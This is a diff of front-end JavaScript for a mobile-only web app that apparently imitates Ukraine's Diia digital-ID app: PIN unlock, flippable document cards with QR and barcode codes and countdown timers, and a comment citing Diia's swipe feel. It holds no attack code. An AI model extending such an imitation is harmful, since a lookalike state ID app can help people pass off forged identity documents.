-    var isInWebAppChrome = (window.matchMedia('(display-mode: standalone)').matches);
-    var isPWA = isInWebAppiOS || isInWebAppChrome;
-
-    if (!isMobile) {
-        // Десктоп або планшет — повідомляємо, що тільки мобільний
-        isWorking = false;
-        $('body').html(
-            '<div style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;font-family:sans-serif;text-align:center;padding:20px;">' +
-            '<div style="font-size:48px;margin-bottom:16px;">📱</div>' +
-            '<div style="font-size:20px;font-weight:600;margin-bottom:8px;">Тільки для мобільних</div>' +
-            '<p style="color:#666;font-size:14px;">Відкрийте цю сторінку на смартфоні та встановіть як додаток.</p>' +
-            '</div>'
-        );
-        $('body').addClass('nononopage');
-    } else if (!isPWA) {
-        // Мобільний, але не PWA — показуємо інструкцію
-        isWorking = false;
-        var installHtml;
-        if (isIOS) {
-            installHtml =
-                '<div style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;font-family:sans-serif;text-align:center;padding:24px;">' +
-                '<div style="font-size:48px;margin-bottom:16px;">📲</div>' +
-                '<div style="font-size:20px;font-weight:600;margin-bottom:12px;">Встановіть додаток</div>' +
-                '<p style="color:#444;font-size:14px;line-height:1.6;margin-bottom:16px;">' +
-                '1. Натисніть кнопку <b>Поділитися</b> (квадрат зі стрілкою вгору) внизу Safari<br>' +
-                '2. Оберіть <b>«На екран "Домівка"»</b><br>' +
-                '3. Натисніть <b>«Додати»</b> та відкрийте додаток з екрану' +
-                '</p>' +
-                '<div style="font-size:36px;">⬆️ 🔲</div>' +
-                '</div>';
-        } else {
-            installHtml =
-                '<div style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;font-family:sans-serif;text-align:center;padding:24px;">' +
-                '<div style="font-size:48px;margin-bottom:16px;">📲</div>' +
-                '<div style="font-size:20px;font-weight:600;margin-bottom:12px;">Встановіть додаток</div>' +
-                '<p style="color:#444;font-size:14px;line-height:1.6;margin-bottom:16px;">' +
-                '1. Натисніть <b>⋮ три крапки</b> у браузері Chrome<br>' +
-                '2. Оберіть <b>«Додати на головний екран»</b><br>' +
-                '3. Натисніть <b>«Додати»</b> та відкрийте додаток' +
-                '</p>' +
-                '<div style="font-size:36px;">⋮ 🏠</div>' +
-                '</div>';
+    if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+        isInWebAppiOS = (window.navigator.standalone === true);
+        isInWebAppChrome = (window.matchMedia('(display-mode: standalone)').matches);
+        if (navigator.userAgent.match(/Android/)) {
         }
-        $('body').html(installHtml);
+        if (isInWebAppiOS == false && isInWebAppChrome == false) {
+            isWorking = false;
+            $('body').html('<div class="nonono"><br>Натисніть три точки в браузері і додайте цю сторінку на головний екран<br></div>');
+            $('body').addClass('nononopage');
+        }
+
+    } else {
+        isWorking = false;
+        $('body').html('<body class="nononopage"><div class="nonono installTutorial" style="width: 100%;padding: 1vh;display: flex;flex-wrap: wrap;justify-content: center;"><div class="installPage" style="text-align: center;padding: 15px;"><div class="installName" style="font-size: 20px;font-weight: 600;"><br>Сайт доступний</div><p>Тільки з мобільних пристроїв<br></p></div></div>');
         $('body').addClass('nononopage');
     }
 
@@ -5190,76 +4625,44 @@
         duration: 15000,
     });
 
-    let enteredPin = '';
+    function vhod(type) {
+        if ($('.start-vhod > div.active')[0]) {
+            if (type === 'plus') {
+                $('.start-vhod > div')[
+                    document.querySelectorAll('.start-vhod > div.active')
+                        .length
+                ].classList.add('active');
+                if (
+                    document.querySelectorAll('.start-vhod > div.active')
+                        .length == 4
+                ) {
+                    $('.start-div').removeClass('active');
+                    $('.main').addClass('active');
 
-function updatePinDots() {
-    const dots = document.querySelectorAll('.start-vhod > div');
-    dots.forEach((dot, i) => {
-        dot.classList.toggle('active', i < enteredPin.length);
-    });
-}
-
-function shakePinPad() {
-    const block = document.querySelector('.start-block');
-    if (typeof gsap !== 'undefined') {
-        gsap.fromTo(block, { x: 0 }, { x: [-12, 12, -8, 8, 0], duration: 0.4 });
+                    $('.blockStart').addClass('active');
+                }
+            } else {
+                $('.start-vhod > div')[
+                    document.querySelectorAll('.start-vhod > div.active')
+                        .length - 1
+                ].classList.remove('active');
+            }
+        } else {
+            $('.start-vhod > div')[0].classList.add('active');
+        }
     }
-    navigator.vibrate?.([50, 30, 50]);
-}
 
-function unlockApp() {
-    const startDiv = document.querySelector('.start-div');
-    const main = document.querySelector('.main');
-    if (typeof gsap !== 'undefined') {
-        gsap.timeline()
-            .to(startDiv, { opacity: 0, scale: 0.96, duration: 0.35, ease: 'power2.inOut' })
-            .set(startDiv, { display: 'none' })
-            .fromTo(main, { opacity: 0, y: 24 }, { opacity: 1, y: 0, duration: 0.5, ease: 'power3.out' })
-            .add(() => {
-                startDiv.classList.remove('active');
-                main.classList.add('active');
-                document.querySelector('.blockStart')?.classList.add('active');
+    document
+        .querySelectorAll('.start-block > button')
+        .forEach(function (el) {
+            el.addEventListener('click', function () {
+                if ($(this).attr('data-type') == 'delete') {
+                    vhod('minus');
+                } else {
+                    vhod('plus');
+                }
             });
-    } else {
-        startDiv.classList.remove('active');
-        main.classList.add('active');
-        document.querySelector('.blockStart')?.classList.add('active');
-    }
-}
-
-function vhod(type, digit) {
-    if (type === 'minus') {
-        enteredPin = enteredPin.slice(0, -1);
-        updatePinDots();
-        return;
-    }
-    if (enteredPin.length >= 4) return;
-    enteredPin += digit;
-    updatePinDots();
-    if (enteredPin.length === 4) {
-        if (enteredPin === (typeof entryPin !== 'undefined' ? entryPin : '1234')) {
-            unlockApp();
-        } else {
-            shakePinPad();
-            enteredPin = '';
-            setTimeout(updatePinDots, 400);
-        }
-    }
-}
-
-   document.querySelectorAll('.start-block > button').forEach(function (el) {
-    el.addEventListener('click', function () {
-        if ($(this).attr('data-type') == 'delete') {
-            vhod('minus');
-        } else {
-            vhod('plus', this.textContent.trim());
-        }
-    });
-});
-
-    document.querySelector('.start-block > img[src*="biometrics"]')?.addEventListener('click', () => {
-    if (typeof allowBiometricSkip !== 'undefined' && allowBiometricSkip) unlockApp();
-}); 
+        });
 
     document.querySelectorAll('.footer > div').forEach((div) => {
         div.addEventListener('click', function () {
@@ -5271,37 +4674,44 @@ function vhod(type, digit) {
             } else {
                 $('.video-background').removeClass('active')
             }
-            var mainEl   = document.querySelector('.main.active');
-            var footerEl = document.querySelector('.footer');
             if (index == 1) {
-                if (mainEl) { mainEl.style.display = 'flex'; mainEl.style.flexDirection = 'column'; }
-                if (footerEl) { footerEl.style.position = 'unset'; footerEl.style.zIndex = '0'; }
-                document.querySelectorAll('.swiper-container').forEach(function (el) { el.style.height = 'unset'; });
-                var h = window.innerHeight < 700 ? '450px' : '500px';
-                document.querySelectorAll('.swiper-slide').forEach(function (el) { el.style.height = h; });
+                document.querySelector('.main.active').style.display = 'flex'
+                document.querySelector('.main.active').style.flexDirection = 'column'
+
+                document.querySelector('.footer').style.position = 'unset'
+
+                document.querySelectorAll('.swiper-container').forEach(function (el) {
+                    el.style.height = 'unset'
+                })
+                document.querySelector('.footer').style.zIndex = '0'
+
+                if (window.innerHeight < 700) {
+                    document.querySelectorAll('.swiper-slide').forEach(function (el) {
+                        el.style.height = '450px'
+                    })
+                } else {
+                    document.querySelectorAll('.swiper-slide').forEach(function (el) {
+                        el.style.height = '500px'
+                    })
+                }
             } else {
-                if (mainEl) { mainEl.style.display = 'block'; mainEl.style.flexDirection = ''; }
-                document.querySelectorAll('.swiper-container').forEach(function (el) { el.style.height = '60%'; });
-                if (footerEl) { footerEl.style.position = 'absolute'; footerEl.style.zIndex = '2'; }
-                document.querySelectorAll('.swiper-slide').forEach(function (el) { el.style.height = '100%'; });
+                document.querySelector('.main.active').style.display = 'block'
+                document.querySelector('.main.active').style.flexDirection = ''
+                document.querySelectorAll('.swiper-container').forEach(function (el) {
+                    el.style.height = '60%'
+                })
+                document.querySelector('.footer').style.position = 'absolute'
+                document.querySelector('.footer').style.zIndex = '2'
+                document.querySelectorAll('.swiper-slide').forEach(function (el) {
+                    el.style.height = '100%'
+                })
             }
 
-            var blocks = document.querySelectorAll('.block');
-            if (index >= 0 && index < blocks.length) blocks[index].classList.add('active');
+            document
+                .querySelectorAll('.block')
+            [index].classList.add('active');
         });
     });
-     
-    document.querySelectorAll('.quick-action').forEach(btn => {
-    btn.addEventListener('click', () => {
-        const action = btn.dataset.action;
-        const texts = {
-            'scan-qr': 'Сканування QR-коду',
-            'bonds': 'Військові облігації',
-            'no-signal': 'Заява про відсутній звʼязок'
-        };
-        showNotification(texts[action] || 'Скоро');
-    });
-});
 
     document.querySelectorAll('.moreInfo').forEach((el) => {
         el.addEventListener('click', function (e) {
@@ -5342,8 +4752,7 @@ function vhod(type, digit) {
 
     const notification = document.getElementById('notification');
 
-    function showNotification(msg) {
-        if (msg) notification.textContent = msg;
+    function showNotification() {
         notification.classList.add('show');
         setTimeout(() => {
             notification.classList.remove('show');
@@ -5401,38 +4810,55 @@ function vhod(type, digit) {
         cardTimers.set(sliderEl, { interval, minutes, seconds });
     }
 
-    const cardState = new WeakMap();
+    // ─────────────────────────────────────────────────────────────
+    // FLIP-КАРТКИ — оригінальна логіка +=180 через anime.js
+    // ─────────────────────────────────────────────────────────────
+    document.querySelectorAll('.slider').forEach((sliderEl) => {
+        sliderEl.addEventListener('click', function (e) {
+            // Ігноруємо кліки по кнопках всередині картки
+            if (e.target.closest('.qrChange, .copyPng, .moreInfo')) return;
 
-function flipCard(sliderEl) {
-    const state = cardState.get(sliderEl) || { flipped: false, animating: false };
-    if (state.animating) return;
-    state.animating = true;
-    sliderEl.classList.add('is-flipping');
-    const next = state.flipped ? 0 : 180;
-    const onDone = () => {
-        state.flipped = !state.flipped;
-        state.animating = false;
-        sliderEl.classList.remove('is-flipping');
-        if (state.flipped) startCardCountdown(sliderEl);
-        else if (cardTimers.has(sliderEl)) {
-            clearInterval(cardTimers.get(sliderEl).interval);
-            cardTimers.delete(sliderEl);
-        }
-    };
-    if (typeof gsap !== 'undefined') {
-        gsap.to(sliderEl, { rotateY: next, duration: 0.55, ease: 'power2.inOut', transformPerspective: 1200, onComplete: onDone });
-    } else {
-        anime({ targets: sliderEl, rotateY: next, duration: 300, easing: 'easeInOutQuad', complete: onDone });
-    }
-    cardState.set(sliderEl, state);
-}
+            // Визначаємо поточний кут з transform-рядка
+            const style = sliderEl.getAttribute('style') || '';
+            const match = style.match(/rotateY\((-?[\d.]+)deg\)/);
+            const currentAngle = match ? parseFloat(match[1]) : 0;
+            const isFlipped = (Math.round(currentAngle) % 360 !== 0);
 
-document.querySelectorAll('.slider').forEach((sliderEl) => {
-    sliderEl.addEventListener('click', function (e) {
-        if (e.target.closest('.qrChange, .copyPng, .moreInfo')) return;
-        flipCard(sliderEl);
+            anime({
+                targets: sliderEl,
+                rotateY: { value: '+=180', delay: 0 },
+                easing: 'easeInOutQuad',
+                duration: 300,
+            });
+
+            // При відкритті (лицева → QR)
+            if (!isFlipped) {
+                startCardCountdown(sliderEl);
+
+                const qrChange = sliderEl.querySelector('.changeCode');
+                if (qrChange) {
+                    qrChange.classList.remove('shcode');
+                    qrChange.classList.add('qrcode');
+                    qrChange.style.opacity = '1';
+                }
+                const shText = sliderEl.querySelector('.shText');
+                if (shText) shText.style.display = 'none';
+
+                const btns = sliderEl.querySelectorAll('.qrChange > div > div');
+                btns.forEach((b, i) => {
+                    b.style.background = i === 0 ? 'black' : '#ddd';
+                    const img = b.querySelector('img');
+                    if (img) img.style.filter = i === 0 ? 'brightness(0) invert(1)' : '';
+                });
+            } else {
+                // При закритті зупиняємо таймер
+                if (cardTimers.has(sliderEl)) {
+                    clearInterval(cardTimers.get(sliderEl).interval);
+                    cardTimers.delete(sliderEl);
+                }
+            }
+        });
     });
-});
 
     // ─────────────────────────────────────────────────────────────
     // QR ↔ BARCODE перемикач — ізольований до своєї картки
@@ -5505,6 +4931,7 @@ document.querySelectorAll('.slider').forEach((sliderEl) => {
     // ─────────────────────────────────────────────────────────────
     // АНІМАЦІЯ ПІН-КРАПОК — spring bounce при заповненні
     // ─────────────────────────────────────────────────────────────
+    const origVhod = window.vhod; // зберігаємо оригінал якщо є
     function animatePinDots() {
         const activeDots = document.querySelectorAll('.start-vhod > div.active');
         activeDots.forEach((dot) => {
@@ -5520,19 +4947,30 @@ document.querySelectorAll('.slider').forEach((sliderEl) => {
     // Перехоплюємо клік по кнопках пін-коду для анімації крапок
     document.querySelectorAll('.start-block > button:not([data-type])').forEach((btn) => {
         btn.addEventListener('click', function () {
-            setTimeout(animatePinDots, 50);
+            // Невелика затримка щоб dot.active вже був проставлений
+            setTimeout(animatePinDots, 10);
         });
     });
 
     // ─────────────────────────────────────────────────────────────
-    // АНІМАЦІЯ FOOTER-TABS
+    // АНІМАЦІЯ FOOTER-TABS — підсвічування активної вкладки
     // ─────────────────────────────────────────────────────────────
     document.querySelectorAll('.footer > div').forEach((tab) => {
         tab.addEventListener('pointerdown', function () {
-            anime({ targets: this, scale: [1, 0.9], duration: 80, easing: 'easeOutQuad' });
+            anime({
+                targets: this,
+                scale: [1, 0.9],
+                duration: 80,
+                easing: 'easeOutQuad',
+            });
         });
         tab.addEventListener('pointerup', function () {
-            anime({ targets: this, scale: [0.9, 1], duration: 250, easing: 'spring(1, 80, 15, 0)' });
+            anime({
+                targets: this,
+                scale: [0.9, 1],
+                duration: 250,
+                easing: 'spring(1, 80, 15, 0)',
+            });
         });
     });
 
@@ -5542,12 +4980,17 @@ document.querySelectorAll('.slider').forEach((sliderEl) => {
     document.querySelectorAll('.copyPng').forEach((icon) => {
         icon.addEventListener('click', function (e) {
             e.stopPropagation();
-            anime({ targets: this, scale: [1, 1.5, 1], duration: 400, easing: 'spring(1, 80, 20, 0)' });
+            anime({
+                targets: this,
+                scale: [1, 1.5, 1],
+                duration: 400,
+                easing: 'spring(1, 80, 20, 0)',
+            });
             showNotification();
         });
     });
 
-    (function () {
+    window.addEventListener('DOMContentLoaded', function () {
 
         // Удаляем блоки, если документ неактивен
         var statusMapping = [
@@ -5565,126 +5008,28 @@ document.querySelectorAll('.slider').forEach((sliderEl) => {
         });
 
         // Swiper — документи
-        // ── ДОКУМЕНТИ: iOS-style картки зі snap + 3D ──────────────────────────
         if (document.querySelector('.documentSlider')) {
-            const docSwiper = new Swiper('.documentSlider', {
-                // Вигляд
-                slidesPerView:   1.08,
-                centeredSlides:  true,
-                spaceBetween:    14,
-
-                // iOS momentum-feel
-                speed:              420,
-                grabCursor:         true,
-                freeMode:           false,
-                resistanceRatio:    0.55,
-                touchReleaseOnEdges: true,
-                watchSlidesProgress: true,
-                longSwipesRatio:     0.15,
-                longSwipesMs:        100,
-                shortSwipes:         true,
-
-                // Фізика свайпу як в Дія
-                touchStartPreventDefault: false,
-                touchMoveStopPropagation: false,
-                touchAngle:              35,
-                threshold:               4,
-
-                // Пагінація
+            new Swiper('.documentSlider', {
                 pagination: {
-                    el:             '.swiper-pagination',
-                    clickable:      true,
-                    dynamicBullets: true,
-                    dynamicMainBullets: 3,
-                },
-
-                // Keyboard
-                keyboard: { enabled: true, onlyInViewport: true },
-
-                // 3D-ефект: масштаб + підйом сусідніх карток
-                on: {
-                    setTranslate(swiper) {
-                        swiper.slides.forEach(slide => {
-                            if (!slide.classList.contains('swiper-slide')) return;
-                            const progress = slide.progress !== undefined ? slide.progress : 0;
-                            const absP     = Math.abs(progress);
-
-                            // Масштаб: активна 100%, сусідні ~93%
-                            const scale  = 1 - Math.min(absP * 0.07, 0.07);
-                            // Вертикальний зсув: підйом активної картки
-                            const translateY = absP * 14;
-                            // Яскравість: сусідні трохи темніші
-                            const opacity = 1 - Math.min(absP * 0.18, 0.3);
-                            // Z-depth
-                            const translateZ = -absP * 30;
-
-                            slide.style.transform  = `scale(${scale}) translateY(${translateY}px) translateZ(${translateZ}px)`;
-                            slide.style.opacity    = opacity;
-                            slide.style.zIndex     = Math.round(100 - absP * 10);
-                        });
-                    },
-                    setTransition(swiper, duration) {
-                        swiper.slides.forEach(slide => {
-                            slide.style.transitionDuration      = duration + 'ms';
-                            slide.style.transitionTimingFunction = 'cubic-bezier(0.32, 0.72, 0, 1)';
-                        });
-                    },
-                    slideChangeTransitionStart(swiper) {
-                        // Хаптіка при зміні картки (iOS / Android)
-                        if (navigator.vibrate) navigator.vibrate(8);
-                        if (window.webkit?.messageHandlers?.haptic) {
-                            window.webkit.messageHandlers.haptic.postMessage({ type: 'light' });
-                        }
-                    },
-                    slideChangeTransitionEnd(swiper) {
-                        // Скидаємо флип карток що не активні
-                        swiper.slides.forEach((slide, i) => {
-                            if (i !== swiper.activeIndex) {
-                                const sliderEl = slide.querySelector('.slider');
-                                if (sliderEl) {
-                                    const state = cardState.get(sliderEl);
-                                    if (state && state.flipped) {
-                                        gsap && gsap.set(sliderEl, { rotateY: 0 });
-                                        state.flipped = false;
-                                        if (cardTimers.has(sliderEl)) {
-                                            clearInterval(cardTimers.get(sliderEl).interval);
-                                            cardTimers.delete(sliderEl);
-                                        }
-                                    }
-                                }
-                            }
-                        });
-                    },
-                },
-            });
-
-            // Зберігаємо інстанс глобально (для зовнішніх викликів)
-            window._docSwiper = docSwiper;
-        }
-
-        // ── НОВИНИ: м'який горизонтальний скролл ─────────────────────────────
-        if (document.querySelector('.sliderNews')) {
-            new Swiper('.sliderNews', {
-                slidesPerView:  1.05,
-                centeredSlides: true,
-                spaceBetween:   16,
-                speed:          380,
-                grabCursor:     true,
-                freeMode: {
-                    enabled:   true,
-                    momentum:  true,
-                    momentumRatio:    0.7,
-                    momentumBounce:   true,
-                    momentumVelocityRatio: 0.6,
-                },
-                pagination: {
-                    el:        '.swiper-pagination2',
+                    el: '.swiper-pagination',
                     clickable: true,
                 },
+                slidesPerView: 1.15,
+                centeredSlides: true,
             });
         }
-    } // end if documentSlider
-    }()); // IIFE runs immediately
+
+        // Swiper — новини
+        if (document.querySelector('.sliderNews')) {
+            new Swiper('.sliderNews', {
+                pagination: {
+                    el: '.swiper-pagination2',
+                    clickable: true,
+                },
+                spaceBetween: 30,
+            });
+        }
+    });
 
 
     function getCurrentDateTime() {
@@ -5719,47 +5064,115 @@ document.querySelectorAll('.slider').forEach((sliderEl) => {
         e.textContent = getCurrentDateTime();
     });
 
-    // #openQr / #openSh — використовуємо flipCard + scoped qrChange
-    // (ці кнопки посилаються на картку через data-index="<class>")
-    function activateQrShBtn(type, btnIndex) {
-        var sliderEl = document.querySelector('.' + type);
-        if (!sliderEl) return;
-        document.querySelectorAll('.' + type + '_block_div.active').forEach(function(el){ el.classList.remove('active'); });
-        flipCard(sliderEl);
-        var qrChangeBlock = sliderEl.querySelector('.qrChange');
-        if (!qrChangeBlock) return;
-        var allBtns = qrChangeBlock.querySelectorAll('div[data-index] > div');
-        allBtns.forEach(function(b){ b.style.background = '#ddd'; var img = b.querySelector('img'); if(img) img.style.filter=''; });
-        var targetBtn = allBtns[btnIndex];
-        if (!targetBtn) return;
-        targetBtn.style.background = 'black';
-        var tImg = targetBtn.querySelector('img');
-        if (tImg) tImg.style.filter = 'brightness(0) invert(1)';
-        var changeCode = sliderEl.querySelector('.changeCode');
-        var shText = sliderEl.querySelector('.shText');
-        if (btnIndex === 0) {
-            if (changeCode) { changeCode.classList.remove('shcode'); changeCode.classList.add('qrcode'); }
-            if (shText) shText.style.display = 'none';
-        } else {
-            if (changeCode) { changeCode.classList.add('shcode'); changeCode.classList.remove('qrcode'); }
-            if (shText) shText.style.display = 'flex';
-        }
-    }
-    document.querySelectorAll('#openQr').forEach(function(e){
-        e.addEventListener('click', function(){ activateQrShBtn($(this).attr('data-index'), 0); });
+    document.querySelectorAll('#openQr').forEach(function (e) {
+        e.addEventListener('click', function (element) {
+            const type = $(this).attr('data-index');
+            const div = document.querySelector(`.${type}`);
+
+            $(`.${type}_block_div.active`).removeClass('active');
+
+            anime({
+                targets: div,
+                rotateY: {
+                    value: '+=180',
+                    delay: 0,
+                },
+                easing: 'linear',
+                duration: 100,
+                complete: function (anim) {
+                    playing = false;
+                },
+            });
+
+            const her = $(`.${type}`).find('.qrChange > div > div')[0];
+
+            console.log(her);
+
+            $(her).css({ background: 'black' });
+            $(her).find('img').css('filter', 'brightness(0) invert(1)');
+            const our = $(her).parent('div');
+            var need = '';
+            if (our.attr('data-index') === '1') {
+                $('.changeCode').removeClass('shcode');
+                $('.changeCode').addClass('qrcode');
+                $('.shText').css('display', 'none');
+                need = our.next(`[data-index="2"]`);
+            } else {
+                $('.changeCode').addClass('shcode');
+                $('.changeCode').removeClass('qrcode');
+                $('.shText').css('display', 'flex');
+                need = our.prev(`[data-index="1"]`);
+            }
+            need.find('div').css('background', '#ddd');
+            need.find('div > img').css('filter', 'brightness(1) invert(0)');
+        });
     });
-    document.querySelectorAll('#openSh').forEach(function(e){
-        e.addEventListener('click', function(){ activateQrShBtn($(this).attr('data-index'), 1); });
+
+    document.querySelectorAll('#openSh').forEach(function (e) {
+        e.addEventListener('click', function (element) {
+            const type = $(this).attr('data-index');
+            const div = document.querySelector(`.${type}`);
+
+            $(`.${type}_block_div.active`).removeClass('active');
+
+            anime({
+                targets: div,
+                rotateY: {
+                    value: '+=180',
+                    delay: 0,
+                },
+                easing: 'linear',
+                duration: 100,
+                complete: function (anim) {
+                    playing = false;
+                },
+            });
+
+            const her = $(`.${type}`).find('.qrChange > div > div')[1];
+
+            console.log(her);
+
+            $(her).css({ background: 'black' });
+            $(her).find('img').css('filter', 'brightness(0) invert(1)');
+            const our = $(her).parent('div');
+            var need = '';
+            if (our.attr('data-index') === '1') {
+                $('.changeCode').removeClass('shcode');
+                $('.changeCode').addClass('qrcode');
+                $('.shText').css('display', 'none');
+                need = our.next(`[data-index="2"]`);
+            } else {
+                $('.changeCode').addClass('shcode');
+                $('.changeCode').removeClass('qrcode');
+                $('.shText').css('display', 'flex');
+                need = our.prev(`[data-index="1"]`);
+            }
+            need.find('div').css('background', '#ddd');
+            need.find('div > img').css('filter', 'brightness(1) invert(0)');
+        });
     });
 
 
 
 
 
-    // BUG10 removed: block2 active removal setTimeout was killing tab state
+    setTimeout(function () {
+        $('.block2.active').removeClass('active');
+    }, 1000);
 
     // $('.study').parent('div').remove();
 
     // Пройдитесь по всем элементам и запустите для каждого обратный отсчёт
 </script>
 </html>
+
+
+
+
+
+
+
+
+
+
+
